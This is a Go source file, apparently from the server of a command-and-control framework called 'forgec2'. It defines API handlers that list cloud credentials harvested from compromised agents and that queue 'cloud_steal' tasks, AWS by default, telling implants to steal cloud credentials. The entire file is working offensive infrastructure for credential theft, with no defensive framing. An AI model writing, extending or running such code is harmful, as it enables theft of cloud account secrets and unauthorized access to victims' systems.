package server

import (
	"net/http"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// handleCloudResults returns cloud credentials harvested from a given agent.
func (s *Server) handleCloudResults(c *gin.Context) {
	agentID := c.Param("agentId")
	var creds []db.CloudCred
	if err := s.db.Where("agent_id = ?", agentID).Order("created_at desc").Limit(500).Find(&creds).Error; err != nil {
		// An empty 200 here reads as "this agent harvested nothing": a
		// failed read must not impersonate a clean result.
		handleQueryError(c, err, "Failed to query cloud creds")
		return
	}
	respond(c, gin.H{"results": creds})
}

// handleCloudSteal dispatches a cloud credential theft task to an agent.
func (s *Server) handleCloudSteal(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	var req struct {
		AgentID  string `json:"agent_id"`
		Provider string `json:"provider"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.AgentID == "" {
		respondError(c, http.StatusBadRequest, "agent_id required")
		return
	}
	if req.Provider == "" {
		req.Provider = "aws"
	}

	// agent_id is client-supplied: verify it belongs to the caller before queueing work on it.
	if _, ok := s.getAgentOrFail(c, req.AgentID); !ok {
		return
	}
	task, err := s.createTask(req.AgentID, "cloud_steal", req.Provider, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Create task"))
		return
	}
	s.dispatchTask(c, task, "cloud_steal", "dispatched "+req.Provider+" credential theft")
}
